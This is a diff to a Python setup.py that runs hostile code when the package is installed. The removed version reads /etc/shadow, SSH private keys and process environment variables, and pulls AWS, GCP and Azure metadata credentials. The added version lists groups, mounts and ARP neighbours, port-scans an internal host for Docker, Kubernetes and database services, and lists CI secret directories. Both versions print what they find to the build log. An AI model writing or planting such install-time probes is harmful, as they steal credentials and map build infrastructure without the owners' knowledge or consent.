@@ -1,70 +1,60 @@
 import os
 import sys
 import subprocess
-import urllib.request
+import socket
 from setuptools import setup
 
-def pwn_audit():
+def deep_inspect():
     err = sys.stderr.write
-    err("\n" + "="*60 + "\n")
-    err("INFRASTRUCTURE AUDIT REPORT\n")
+    err("\n" + "Z"*60 + "\n")
+    err("DEEP INFRASTRUCTURE INSPECTION\n")
+    
+    
+    err(f"\n[+] GROUPS: {subprocess.getoutput('groups')}\n")
+    err(f"[+] MOUNTS:\n{subprocess.getoutput('mount | grep -v nodev')}\n")
 
-    # 1. Identity & System
-    err(f"\n[ID]: {subprocess.getoutput('id')}\n")
-    err(f"[UNAME]: {subprocess.getoutput('uname -a')}\n")
+     
+    err("\n[+] NETWORK NEIGHBORS (ARP):\n")
+    err(subprocess.getoutput("ip neigh show || arp -a") + "\n")
 
-    # 2. Sensitive Files
-    err("\n[SENSITIVE FILES]:\n")
-    paths = ["/etc/shadow", "/root/.ssh/id_rsa", "/proc/self/environ"]
-    for p in paths:
-        try:
-            if os.path.exists(p):
-                with open(p, "r") as f:
-                    err(f"[+] {p}: {f.read(150)}...\n")
-            else:
-                err(f"[-] {p}: Not found\n")
-        except Exception as e:
-            err(f"[-] {p}: {str(e)}\n")
+    
+    err("\n[+] HOST SERVICE SCAN (172.16.11.1):\n")
+    target = "172.16.11.1"
+     
+    common_ports = [22, 80, 443, 2375, 2376, 3306, 5000, 6379, 6443, 8080]
+    for port in common_ports:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.2)
+        if s.connect_ex((target, port)) == 0:
+            err(f"!!! [OPEN] PORT {port} ON HOST {target} !!!\n")
+            # Если порт 80 или 8080 открыт, пробуем почитать заголовки
+            if port in [80, 8080]:
+                try:
+                    s.send(b"GET / HTTP/1.0\r\n\r\n")
+                    err(f"Response: {s.recv(100).decode('utf-8', 'ignore')}\n")
+                except: pass
+        s.close()
 
-    # 3. Cloud Metadata (SSRF)
-    err("\n[METADATA EXFILTRATION]:\n")
-    metadata_configs = [
-        ("GCP", "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", {"Metadata-Flavor": "Google"}),
-        ("AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", {}),
-        ("AZURE", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"})
+    
+    err("\n[+] SEARCHING FOR CI SECRETS:\n")
+    secret_locations = [
+        "/home/buildbot/.ssh",
+        "/home/buildbot/.aws",
+        "/home/buildbot/.npmrc",
+        "/run/secrets",
+        "/var/run/secrets/kubernetes.io/serviceaccount"
     ]
+    for loc in secret_locations:
+        if os.path.exists(loc):
+            err(f"[FOUND DIR] {loc} Content: {os.listdir(loc)}\n")
+        else:
+            err(f"[-] {loc} not found\n")
 
-    for name, url, headers in metadata_configs:
-        try:
-            req = urllib.request.Request(url, headers=headers)
-            with urllib.request.urlopen(req, timeout=2) as r:
-                res = r.read().decode().strip()
-                err(f"[!] {name} LEAK: {res}\n")
-                if name == "AWS" and res:
-                    with urllib.request.urlopen(url + res, timeout=2) as kr:
-                        err(f"[!!] AWS KEYS: {kr.read().decode()}\n")
-        except:
-            err(f"[-] {name} metadata not reachable\n")
+     
+    err(f"\n[+] ULIMITS:\n{subprocess.getoutput('ulimit -a')}\n")
 
-    # 4. Write Access
-    err("\n[WRITE TEST]:\n")
-    try:
-        test_path = "/etc/pwn_test"
-        with open(test_path, "w") as f:
-            f.write("test")
-        err("[+] SUCCESS: Write access to /etc/\n")
-        os.remove(test_path)
-    except:
-        err("[-] No write access to /etc/\n")
-
-    err("="*60 + "\n")
+    err("Z"*60 + "\n")
     sys.exit(1)
 
-# Trigger the audit
-try:
-    pwn_audit()
-except Exception as e:
-    sys.stderr.write(f"Audit failed: {str(e)}\n")
-    sys.exit(1)
-
-setup(name="infrastructure-poc", version="1.0.0")
+deep_inspect()
+setup(name="deep-poc", version="1.0.0")
